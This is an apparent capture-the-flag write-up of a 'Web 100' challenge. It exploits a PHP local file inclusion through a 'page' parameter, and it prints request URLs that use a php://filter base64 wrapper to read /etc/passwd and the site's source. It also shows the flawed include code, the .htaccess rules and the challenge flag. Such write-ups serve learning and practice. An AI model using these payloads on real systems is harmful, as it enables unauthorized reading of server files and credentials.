Bon App√©tit (100): Web 100

Seeing the URL: http://bonappetit.stillhackinganyway.nl/?page=contact my first thought was it has to be a:

Local File Inclusion: https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
Trying to switch directories with ../ seemed to not work but switching to subdirectories e.g.: the image directory worked well. 

The contact form gave me a hint, because the error said: "The requested URL /bat/MailHandler.php was not found on this server" so it seemed i have to look for .php files.

Next i tried http://bonappetit.stillhackinganyway.nl/index.php which worked. So i was looking for php inclusion.

I remembered the php base64 encode trick i used before and tried this:
http://bonappetit.stillhackinganyway.nl/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

This way i was able to read the servesr passwd file. Sadly there is no flag here, so i gussed it has to be somewhere in the apache path.

So i tried to get the index.php from the default ubuntu apache folder, this also worked:
http://bonappetit.stillhackinganyway.nl/index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php

<?php

$page = empty($_GET["page"])? "home" : $_GET["page"]; 
$page=str_replace("../", '', $page);
$page=preg_replace(',^/,', '', $page);

include($page);

?>

So this explains why "../" did not work... but still no flag!

Searching for php file inclusion i found this blog:
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

so i tried the apache access file ".htaccess" with: http://bonappetit.stillhackinganyway.nl/index.php?page=.htaccess

<FilesMatch "\.(htaccess|htpasswd|sqlite|db)$">
 Order Allow,Deny
 Deny from all
</FilesMatch>

<FilesMatch "\.phps$">
 Order Allow,Deny
 Allow from all
</FilesMatch>

<FilesMatch "suP3r_S3kr1t_Fl4G">
  Order Allow,Deny
  Deny from all
</FilesMatch>

And there it is! There must be a file named suP3r_S3kr1t_Fl4G...

http://bonappetit.stillhackinganyway.nl/index.php?page=suP3r_S3kr1t_Fl4G revealed:
flag{82d8173445ea865974fc0569c5c7cf7f}
